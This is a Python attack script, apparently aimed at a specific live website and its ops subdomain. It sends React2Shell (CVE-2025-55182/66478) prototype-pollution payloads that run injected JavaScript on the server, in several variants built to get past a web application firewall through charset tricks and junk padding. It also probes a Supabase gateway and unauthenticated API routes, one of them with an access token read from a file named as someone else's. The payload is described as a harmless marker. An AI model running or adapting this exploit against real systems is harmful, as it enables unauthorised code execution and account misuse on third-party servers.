#!/usr/bin/env python3
"""Non-destructive app-layer probe set 3:
 - React2Shell (CVE-2025-55182/66478) detection via SAFE markers, with WAF-bypass variants
   (charset mismatch / junk padding / parser confusion). Marker = JS-eval proof only:
   our _prefix throws NEXT_REDIRECT with digest 'R2S_AUDIT_PROBE_<process.version>'.
   No shell, no file access, no system modification.
 - Supabase gateway endpoint probing through the /api/supabase rewrite.
 - ops Express unauthenticated route checks (GET only).
"""
import ssl, re, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
OPS = "https://ops.onlyfakeai.ru"
KEY = "<publishable-key>"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(
    urllib.request.HTTPSHandler(context=CTX),
    urllib.request.HTTPCookieProcessor(cj))
TOK = json.load(open("their_token.txt"))["access_token"]


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    t = b.decode("utf-8", "ignore")[:3000]
    return "Attention Required" in t or "cf-wrapper" in t


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


MARK = "R2S_AUDIT_PROBE_"
PREFIX = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),"
          "{digest:'%s'+res});" % MARK)


def body_for(bnd, junk_kb=0, empty_first=False):
    def part(name, val):
        return (f"--{bnd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
                f"{val}\r\n")
    parts = []
    if empty_first:
        parts.append(f"--{bnd}\r\nContent-Disposition: form-data; name=\"e\"\r\n\r\n\r\n")
    if junk_kb:
        parts.append(part(rnd(12), "".join(random.choices(string.ascii_letters + string.digits, k=junk_kb * 1024))))
    p0 = ('{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
          '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
          + json.dumps(PREFIX) + ',"_chunks":"$Q2",'
          '"_formData":{"get":"$1:constructor:constructor"}}}')
    parts += [part("0", p0), part("1", '"$@0"'), part("2", "[]")]
    parts.append(f"--{bnd}--\r\n")
    return "".join(parts).encode()


def r2s(tag, ctype_extra="", junk_kb=0, empty_first=False, action=None, path="/"):
    bnd = "----B" + rnd(30)
    ct = f"multipart/form-data; boundary={bnd}"
    if ctype_extra:
        ct += "; " + ctype_extra
    h = {"Content-Type": ct, "Next-Action": action or rnd(40),
         "Accept": "text/x-component", "Origin": BASE,
         "Referer": BASE + "/"}
    st, hd, b = req("POST", BASE + path, headers=h, body=body_for(bnd, junk_kb, empty_first))
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf_block={is_cf(b)} marker={MARK in t} len={len(b)}")
    if MARK in t:
        i = t.find(MARK); print("   >>> DIGEST:", t[i:i + 140].replace("\n", " "))
    elif st != 403 and len(t) < 800:
        print("   body:", t[:500].replace("\n", " "))
    return st, t


# warm cookies
req("GET", BASE + "/")
time.sleep(1)

print("== R2S detection suite (safe marker only) ==")
r2s("plain")
time.sleep(2)
r2s("charset=utf-16le", "charset=utf-16le")
time.sleep(2)
r2s("charset=utf-32", "charset=utf-32")
time.sleep(2)
r2s("charset=ibm037", "charset=ibm037")
time.sleep(2)
r2s("junk128", junk_kb=128)
time.sleep(2)
r2s("utf16le+junk128+empty", "charset=utf-16le", junk_kb=128, empty_first=True)
time.sleep(2)
r2s("utf16le on /en", "charset=utf-16le", path="/en")

print("\n== Supabase gateway endpoints via /api/supabase rewrite (apikey=publishable) ==")
for p in ["/api/supabase/", "/api/supabase/ready", "/api/supabase/metrics",
          "/api/supabase/stats", "/api/supabase/server_info", "/api/supabase/healthz"]:
    st, hd, b = req("GET", BASE + p, headers={"apikey": KEY})
    print(f"[gw] {p} -> {st} ct={hd.get('content-type','')[:30]} len={len(b)}: {b.decode('utf-8','ignore')[:160].replace(chr(10),' ')}")
    time.sleep(1)

print("\n== ops Express unauthenticated checks ==")
for p, hdr in [
    ("/api/jobs/00000000-0000-0000-0000-000000000000", {}),
    ("/api/jobs/00000000-0000-0000-0000-000000000000", {"Authorization": "Bearer " + TOK}),
    ("/api/profiles/00000000-0000-0000-0000-000000000000", {}),
    ("/health", {}),
]:
    st, hd, b = req("GET", OPS + p, headers=hdr)
    print(f"[ops] {p} auth={'y' if hdr else 'n'} -> {st} xpw={hd.get('x-powered-by','')} "
          f"cf-cache={hd.get('cf-cache-status','')} cache={hd.get('cache-control','')[:40]} "
          f"body={b.decode('utf-8','ignore')[:120].replace(chr(10),' ')}")
    time.sleep(1)
